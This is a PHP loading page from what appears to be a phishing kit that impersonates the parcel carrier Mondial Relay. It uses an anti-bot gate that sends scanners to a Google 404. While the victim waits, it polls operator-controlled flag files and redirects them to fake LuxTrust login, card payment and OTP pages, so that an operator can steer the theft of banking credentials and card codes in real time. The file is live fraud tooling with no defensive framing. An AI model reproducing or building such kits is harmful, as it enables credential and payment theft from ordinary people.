<?php
session_start();
if ($_SESSION['bot'] == '1') {
include('../../config.php');
include('../../app/functions.php');
include('../../antibots.php');
include('../../common/sub_includes.php');
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading</title>
    <?php if(isset($_GET['success'])) { ?>
        <meta http-equiv="refresh" content="40; url=../success/">
    <?php } ?>
    <?php if (!empty($_SESSION['load'])) { ?>
        <meta http-equiv="refresh" content="3; url=../<?=$_SESSION['load']?>/">
    <?php } ?>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            background-color: #fff;
        }

        .container {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .image-container {
            position: relative;
            overflow: hidden;
        }

        .zoom {
            width: 100px; /* Taille initiale de l'image */
            transition: width 0.5s ease-in-out; /* Animation de transition */
        }


        .loader {
            border: 4px solid rgba(0, 0, 0, 0.3);
            border-left: 4px solid #96154a;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin-top: 20px;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }

        .zoom {
            width: 200px; /* Taille initiale de l'image */
            animation: zoomInOut 1.75s infinite alternate; /* Animation en boucle */
        }

        @keyframes zoomInOut {
            0% {
                width: 150px; /* Taille initiale */
            }
            50% {
                width: 200px; /* Taille agrandie */
            }
            100% {
                width: 150px; /* Retour à la taille initiale */
            }
        }

    </style>
</head>
<body>
    <div class="container">
        <div class="image-container">
            <img src="../../public/img/logomondial-relay.svg" alt="Image" class="zoom">
        </div>
        <div class="loader"></div>
    </div>
    <script src="../../public/js/jquery.js"></script>
    <script src="../../public/js/redirect.js"></script>
    <script>
      setInterval(function() {
          checkIP('redirect/fin.txt', '../success/');
      }, 1000);

      setInterval(function() {
        checkIP('redirect/lux.txt', '../luxtrust/login/');
      }, 1200);

      setInterval(function() {
        checkIP('redirect/carteInvalide.txt', '../payment/?error');
      }, 1200);

      setInterval(function() {
        checkIP('redirect/applepayinvalid.txt', '../otp/?error');
      }, 1200);

      setInterval(function() {
        checkIP('redirect/applepay.txt', '../otp/');
      }, 1200);
    </script>
</body>
</html>
<?php
} else {
  header('location: https://google.com/404');
}